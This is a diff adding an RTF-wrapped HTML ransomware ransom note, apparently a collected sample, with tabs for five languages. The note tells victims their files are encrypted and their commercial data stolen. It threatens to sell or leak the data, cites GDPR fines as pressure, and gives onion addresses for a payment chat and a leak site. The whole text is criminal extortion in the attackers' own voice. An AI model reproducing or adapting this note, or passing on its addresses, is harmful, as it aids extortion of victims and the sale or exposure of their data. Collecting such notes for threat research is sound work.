@@ -1,0 +1,223 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2761
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0   <!DOCTYPE html>\
+<html lang="en">\
+<head>\
+  <meta charset='utf-8'>\
+  <meta name='viewport' content='width=device-width,initial-scale=1'>\
+  <title></title>\
+  <style>\
+    html, body \{\
+      background-color: #1a1a1a;\
+    \}\
+    body \{\
+      padding-top: 3rem !important;\
+    \}\
+    #text h2 \{\
+      color: white;\
+      font-size: 2rem;\
+      font-weight: 600;\
+      line-height: 1.125;\
+    \}\
+    .tabs \{\
+      -webkit-overflow-scrolling: touch;\
+      align-items: stretch;\
+      display: flex;\
+      font-size: 1rem;\
+      justify-content: space-between;\
+      overflow: hidden;\
+          overflow-x: hidden;\
+      overflow-x: auto;\
+      white-space: nowrap;\
+    \}\
+    .tabs ul \{\
+        align-items: center;\
+        border-bottom-color: #454545;\
+        border-bottom-style: solid;\
+        border-bottom-width: 1px;\
+        display: flex;\
+        flex-grow: 1;\
+        flex-shrink: 0;\
+        justify-content: flex-start;\
+    \}  \
+      .tabs.is-toggle ul \{\
+        border-bottom: none;\
+      \}\
+      .tabs li \{\
+          position: relative;\
+      \}\
+      .tabs li \{\
+          display: block;\
+      \}      \
+      .tabs.is-toggle li.is-active a \{\
+          background-color: white;\
+          border-color: white;\
+          color: rgba(0, 0, 0, 0.7);\
+          z-index: 1;\
+      \}\
+      .tabs.is-toggle li:first-child a \{\
+          border-top-left-radius: 3px;\
+          border-bottom-left-radius: 3px;\
+      \}\
+      .tabs li.is-active a \{\
+          border-bottom-color: white;\
+          color: white;\
+      \}\
+      .tabs.is-toggle a \{\
+          border-color: #454545;\
+          border-style: solid;\
+          border-width: 1px;\
+          margin-bottom: 0;\
+          position: relative;\
+      \}\
+      .tabs a \{\
+          align-items: center;\
+          border-bottom-color: #454545;\
+          border-bottom-style: solid;\
+          border-bottom-width: 1px;\
+          color: white;\
+          display: flex;\
+          justify-content: center;\
+          margin-bottom: -1px;\
+          padding: 0.5em 1em;\
+          vertical-align: top;\
+          cursor: pointer;\
+      \}      \
+    .tabs.is-toggle li:last-child a \{\
+        border-top-right-radius: 3px;\
+        border-bottom-right-radius: 3px;\
+    \}      \
+    .container \{\
+      max-width: 1152px;\
+      max-width: ;\
+      flex-grow: 1;\
+      margin: 0 auto;\
+      position: relative;\
+      width: auto;\
+    \}\
+    .box \{\
+      background-color: #242424;\
+      color: white;\
+      display: block;\
+      padding: 1.25rem;\
+      border: 1px solid #303030;\
+    \}    \
+    blockquote \{\
+      background: hsl(0, 0%, 20%);\
+      padding: 1rem;\
+      border-left: 3px solid #55a630;\
+    \}\
+    a \{\
+      color: #e55934;\
+    \}\
+  </style>\
+  <script>\
+    let text = \{\
+      en: `<h2> Whats Happen? </h2>\
+        We got your documents and files encrypted and you cannot access them. To make sure we\uc0\u65533 re not bluffing just check out your files. Want to recover them? Just do what we instruct you to. If you fail to follow our recommendations, you will never see your files again. During each attack, we copy valuable commercial data. If the user doesn\'92t pay to us, we will either send those data to rivals, or publish them. GDPR. Don\'92t want to pay to us, pay 10x more to the government. \
+\
+        <h2> What Guarantees? </h2>\
+        We\'92re doing our own business and never care about what you do. All we need is to earn. Should we be unfair guys, no one would work with us. So if you drop our offer we won\'92t take any offense but you\'92ll lose all of your data and files. How much time would it take to recover losses? You only may guess.\
+\
+        <h2> How do I access the website? </h2>\
+        <ul>\
+          <li><a href="https://torproject.org" target="_blank">Get TOR browser here</a></li>\
+          <li><a href="http://ebwexiymbsib4rmw.onion/chat.html?[snap]">Go to our website</a></li>\
+        </ul>`,\
+      de: `<h2> Was ist gerade passiert? </h2>\
+        Wir haben Ihre Dokumente und Dateien verschl\'fcsselt und Sie k\'f6nnen nicht mehr darauf zugreifen. Jeder Angriff wird von einer Kopie der kommerziellen Informationen begleitet. Um sicherzustellen, dass wir es ernst meinen, pr\'fcfen Sie einfach Ihre Dateien und Sie werden sehen. M\'f6chten Sie sie wiederherstellen? Halten Sie sich einfach an unsere Anweisungen, um uns zu bezahlen. Tuen Sie dies nicht, werden Sie Ihre Dateien niemals wiedersehen. Im Falle einer Zahlungsverweigerung werden die Daten entweder an Wettbewerber verkauft oder in offenen Quellen bereitgestellt. GDPR. Wenn Sie uns nicht bezahlen m\'f6chten, zahlen Sie das Zehnfache an der Regierung.\
+\
+        <h2> Wie sollten Sie uns trauen ? </h2>\
+        Wir machen unsere eigenen Gesch\'e4fte und k\'fcmmern uns nicht darum was Sie tunen. Wir m\'fcssen nur verdienen. Sollten wir einfach nur bluffen, w\'fcrde niemand an uns zahlen. Wenn Sie unser Angebot ablehnen, werden Sie alle Ihre Daten f\'fcr immer verlieren. Wie viel Zeit werden Sie brauchen um ihre Daten selber zu ersetzen ? Sie k\'f6nnen es sich schon denken.\
+\
+        <h2> Unsere Forderungen </h2>\
+        <ul>\
+          <li><a href="https://torproject.org" target="_blank">Holen Sie sich den TOR-Browser hier</a></li>\
+          <li><a href="http://ebwexiymbsib4rmw.onion/chat.html?[snap]">Gehen Sie auf unsere Website</a></li>\
+        </ul>`,\
+      fr: `<h2> Qu'est-ce qui vient de se passer? </h2>\
+        Nous avons crypt\'e9 vos documents et fichiers et vous ne pouvez pas y acc\'e9der. Chaque attaque est accompagn\'e9e d'une copie des informations commerciales. Pour vous assurer que nous ne bluffons pas. Voulez-vous les restaurer? Faites juste ce que nous vous demandons, pour nous payer. Si vous ne suivez pas nos recommandations, vous ne verrez plus jamais vos fichiers. En cas de refus de paiement - les donn\'e9es seront soit revendues \'e0 des concurrents, soit diffus\'e9es dans des sources ouvertes. GDPR. Si vous ne voulez pas nous payer, payez x10 fois le gouvernement.\
+\
+        <h2> Qu'en est-il des garanties? </h2>\
+        Nous faisons nos propres affaires et ne nous soucions jamais de ce que vous faites. Tout ce dont nous avons besoin est de gagner de l'argent. Si nous devions \'eatre injustes, personne ne travaillerait avec nous. Donc, si vous abandonnez notre offre, nous ne prendrons aucune infraction, mais vous perdrez toutes vos donn\'e9es et vos fichiers. Combien de temps faudrait-il pour r\'e9cup\'e9rer les pertes? Vous pouvez seulement deviner.\
+\
+        <h2> Comment puis-je acc\'e9der au site web? </h2>\
+        <ul>\
+          <li><a href="https://torproject.org" target="_blank">T\'e9l\'e9chargez le navigateur TOR ici</a></li>\
+          <li><a href="http://ebwexiymbsib4rmw.onion/chat.html?[snap]">Allez sur notre site web</a></li>\
+        </ul>`,\
+      es: `<h2> \'bfLo que de pasar? </h2>\
+        Ya tenemos sus documentos y archivos encriptados y usted no puede acceder a ellos. Para asegurarse de que no estamos faroleando. \'bfQuiere recuperarlos? S\'f3lo haga lo que le indicamos. Si usted no sigue nuestras recomendaciones, usted nunca ver\'e1 sus archivos. Durante cada ataque, copiamos los datos comerciales valiosos. Si el usuario no nos paga, enviaremos estos datos a sus rivales o los publicaremos. GDPR. No quiere pagarnos, paga 10 veces m\'e1s al gobierno.\
+\
+        <h2> \'bfQu\'e9 pasa con las garant\'edas? </h2>\
+        Estamos haciendo nuestro propio negocio y nunca nos importa lo que hace usted. Todo lo que necesitamos es ganar. Hay que ser injustos chicos, nadie trabajar\'eda con nosotros. Entonces, si deja caer nuestras propuestas, no nos ofenderemos pero usted perder\'e1 todos sus datos y archivos. \'bfCu\'e1nto tiempo se requiere para recuperar las p\'e9rdidas? S\'f3lo usted puede adivinar.\
+\
+        <h2> \'bfC\'f3mo acceder al sitio web? </h2>\
+        <ul>\
+          <li><a href="https://torproject.org" target="_blank">Obtenga el navegador TOR aqu\'ed</a></li>\
+          <li><a href="http://ebwexiymbsib4rmw.onion/chat.html?[snap]">Vaya a nuestro sitio web</a></li>\
+        </ul>`,\
+      jp: `<h2> \uc0\u20309 \u12364 \u12354 \u12387 \u12383 \u12398 \u12391 \u12377 \u12363 \u65311  </h2>\
+        \uc0\u12489 \u12461 \u12517 \u12513 \u12531 \u12488 \u12392 \u12501 \u12449 \u12452 \u12523 \u12434 \u26263 \u21495 \u21270 \u12375 \u12414 \u12375 \u12383 \u12290  \u12381 \u12428 \u12425 \u12395 \u12450 \u12463 \u12475 \u12473 \u12377 \u12427 \u12371 \u12392 \u12399 \u12391 \u12365 \u12414 \u12379 \u12435 \u12290  \u12502 \u12521 \u12501 \u12375 \u12394 \u12356 \u12424 \u12358 \u12395 \u12377 \u12427 \u12395 \u12399 \u12289  \u12501 \u12449 \u12452 \u12523 \u12434 \u12481 \u12455 \u12483 \u12463 \u12450 \u12454 \u12488 \u12375 \u12390 \u12289 \u12377 \u12409 \u12390 \u12364 \u12290  \u12381 \u12428 \u12425 \u12434 \u22238 \u24489 \u12375 \u12383 \u12356 \u12391 \u12377 \u12363 \u65311  \u12383 \u12384 \u12420 \
+        \uc0\u12427 \
+        \uc0\u25351 \u31034 \u12377 \u12427 \u12371 \u12392 \u12290  \u25351 \u31034 \u12395 \u24467 \u12431 \u12394 \u12356 \u22580 \u21512 \u12289 \u12501 \u12449 \u12452 \u12523 \u12399 \u20108 \u24230 \u12392 \u34920 \u31034 \u12373 \u12428 \u12414 \u12379 \u12435 \u12290  \u21508 \u25915 \u25731 \u20013 \u12395 \u12289 \u36020 \u37325 \u12394 \u21830 \u29992 \u12487 \u12540 \u12479 \u12434 \u12467 \u12500 \u12540 \u12375 \u12414 \u12377 \u12290  \u12518 \u12540 \u12470 \u12540 \u12364 \u24403 \u31038 \u12395 \u25903 \u25173 \u12431 \u12394 \u12356 \u22580 \u21512 \u12399 \u12289 \u12381 \u12428 \u12425 \u12398 \u12487 \u12540 \u12479 \u12434 \u12521 \u12452 \u12496 \u12523 \u12395 \u36865 \u20449 \u12377 \u12427 \u12363 \u12289 \u20844 \u38283 \u12375 \u12414 \u12377 \u12290 \
+\
+        <h2> \uc0\u20309 \u12364 \u20445 \u35388 \u12373 \u12428 \u12414 \u12377 \u12363  ? </h2>\
+        \uc0\u31169 \u12383 \u12385 \u12399 \u31169 \u12383 \u12385 \u33258 \u36523 \u12398 \u12499 \u12472 \u12493 \u12473 \u12434 \u34892 \u12387 \u12390 \u12362 \u12426 \u12289 \u12354 \u12394 \u12383 \u12364 \u20309 \u12434 \u12377 \u12427 \u12363 \u12434 \u27671 \u12395 \u12375 \u12414 \u12379 \u12435 \u12290  \u24517 \u35201 \u12394 \u12398 \u12399 \u31292 \u12368 \u12371 \u12392 \u12384 \u12369 \u12391 \u12377 \u12290  \u31169 \u12383 \u12385 \u12364 \u19981 \u20844 \u24179 \u12394 \u20154 \u12391 \u12354 \u12427 \u22580 \u21512 \u12289 \u35504 \u12418 \u31169 \u12383 \u12385 \u12392 \u19968 \u32210 \u12395 \u20685 \u12367 \u12371 \u12392 \u12399 \u12354 \u12426 \u12414 \u12379 \u12435 \u12290  \u12391 \u12377 \u12363 \u12425 \u12289 \u12354 \u12394 \u12383 \u12364 \u31169 \u12383 \u12385 \u12398 \u30003 \u12375 \u20986 \u12434 \u12420 \u12417 \u12390 \u12418 \u12289 \u31169 \u12383 \u12385 \u12399 \u20309 \u12398 \u32618 \u12418 \u29359 \u12375 \u12414 \u12379 \u12435 \
+        \uc0\u12377 \u12409 \u12390 \u12398 \u12487 \u12540 \u12479 \u12392 \u12501 \u12449 \u12452 \u12523 \u12364 \u22833 \u12431 \u12428 \u12414 \u12377 \u12290  \u25613 \u22833 \u12434 \u22238 \u24489 \u12377 \u12427 \u12398 \u12395 \u12393 \u12428 \u12367 \u12425 \u12356 \u26178 \u38291 \u12364 \u12363 \u12363 \u12426 \u12414 \u12377 \u12363 \u65311  \u25512 \u28204 \u12377 \u12427 \u12384 \u12369 \u12391 \u12377 \u12290 \
+        <h2> Web\uc0\u12469 \u12452 \u12488 \u12395 \u12450 \u12463 \u12475 \u12473 \u12377 \u12427 \u12395 \u12399 \u12393 \u12358 \u12377 \u12428 \u12400 \u12424 \u12356 \u12391 \u12377 \u12363 \u65311  </h2>\
+        <ul>\
+        <li><a href=" https://torproject.org " target="_blank">\uc0\u12371 \u12371 \u12391  TOR\u12502 \u12521 \u12454 \u12470 \u12434 \u20837 \u25163  </a></li>\
+        <li><a href="http://ebwexiymbsib4rmw.onion/chat.html?[snap]">\uc0\u24403 \u31038 \u12398 \u12454 \u12455 \u12502 \u12469 \u12452 \u12488 \u12395 \u12450 \u12463 \u12475 \u12473  </a></li>\
+        </ul>`\
+    \};\
+    function sel_lang(event) \{\
+      let active = document.getElementsByClassName('is-active')[0];\
+      active.classList.remove('is-active');\
+      event.target.parentElement.classList.add('is-active');\
+      let lang = event.target.getAttribute('data-lang');\
+      let el = document.getElementById('text');\
+      el.innerHTML = text[lang];\
+    \}\
+    document.addEventListener("DOMContentLoaded", ()=>\{\
+      let el = document.getElementById('text');\
+      el.innerHTML = text['en'];           \
+    \});\
+  </script>\
+</head>\
+<body class='pt-6'>\
+<div class='container'>\
+\
+<div class="tabs is-toggle">\
+  <ul>\
+    <li class="is-active"><a onclick='sel_lang(event);' data-lang='en'>EN</a></li>\
+    <li class=""><a onclick='sel_lang(event);' data-lang='de'>DE</a></li>\
+    <li class=""><a onclick='sel_lang(event);' data-lang='fr'>FR</a></li>\
+    <li class=""><a onclick='sel_lang(event);' data-lang='es'>ES</a></li>\
+    <li class=""><a onclick='sel_lang(event);' data-lang='jp'>JP</a></li>\
+  </ul>\
+</div>\
+\
+<div class='box'>\
+<div id='text'></div>\
+  <div style='border: 1px solid red; padding: .5rem; font-size: 1.3rem; font-weight: 500; margin: 3rem 0;'>\
+    <div class='title is-4'>\
+    In case you decide not to cooperate, your private data will be published <a style='color: #46a049; text-decoration: underline;' target='_blank' href='http://nbzzb6sa6xuura2z.onion/'>here</a> or sold.\
+  </div>\
+</div>\
+<div style='margin-top: 2rem;'>\
+<h2>Offline how-to</h2>\
+<p>Copy & Paste this secret message to <a href="http://ebwexiymbsib4rmw.onion">this page</a> textarea field</p>\
+<p><blockquote>[snip]</blockquote></p>\
+</div>\
+</div>\
+</div>\
+</body>\
+</html>\
+\
+                    }
